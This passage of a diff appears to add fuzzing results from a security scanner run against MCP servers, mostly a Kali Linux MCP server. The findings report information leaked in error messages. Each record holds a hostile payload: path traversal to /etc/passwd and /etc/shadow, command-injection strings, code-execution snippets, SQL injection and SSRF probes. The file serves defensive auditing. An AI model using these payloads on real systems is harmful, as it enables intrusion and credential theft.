+    "response": "{'jsonrpc': '2.0', 'id': 199, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to rename file: ENOENT: no such file or directory, access '/home/tecnico/gsafe/w1/work/etc/passwd/http:/localhost:6379'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "9490cb3753cb",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 3, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': '../../../etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 3, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "28a8aadb3c1a",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 4, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': '....//....//etc/shadow'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 4, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "1ff0b1d6edeb",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 5, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': '/etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 5, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "47105472d281",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 7, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': 'whoami; cat /etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 7, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "0fbf256a784f",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 8, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': '$(id)'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 8, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "f2aa1a240bbf",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 9, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': '`cat /etc/passwd`'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 9, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "5d3f5bc155a7",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 10, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': 'test && ls -la /'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 10, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "d0a10d06edb7",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 11, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': 'test || id'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 11, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "a5c29dcbd589",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 12, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': \"__import__('os').system('id')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 12, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "b8390a6701c6",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 13, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': \"require('child_process').execSync('id').toString()\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 13, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "46d895233117",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 14, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': \"eval('1+1')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 14, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "8e9652967ff0",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 15, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': \"' OR 1=1; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 15, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "0aedbf84ac6d",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 16, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': \"'; DROP TABLE users; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 16, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "ca11410ba905",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 17, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': '1 UNION SELECT * FROM information_schema.tables; --'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 17, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "ee340bee0e0f",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 18, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': 'http://169.254.169.254/latest/meta-data/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 18, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "0493e2c71581",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 19, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': 'http://localhost:6379/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 19, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "d3c87088d7aa",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 20, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': 'file:///etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 20, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "da9d3b613dca",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 21, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': '../../../etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 21, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "5ada171285a3",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 22, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': '....//....//etc/shadow'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 22, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "aa9acf0f49be",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 23, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': '/etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 23, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "9c4b73b2d121",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 25, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': 'whoami; cat /etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 25, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "1755b0aac27a",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 26, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': '$(id)'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 26, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "c25021eb6831",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 27, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': '`cat /etc/passwd`'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 27, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "18f7560d7af2",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 28, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': 'test && ls -la /'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 28, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "68dcd5c47ad6",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 29, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': 'test || id'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 29, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "f5d570210fad",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 30, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': \"__import__('os').system('id')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 30, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "62d6b35eb30e",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 31, 'method': 'tools/call', 'params': {'name': 'start_interactive_command', 'arguments': {'command': \"require('child_process').execSync('id').toString()\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 31, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  }
+ ]
+}
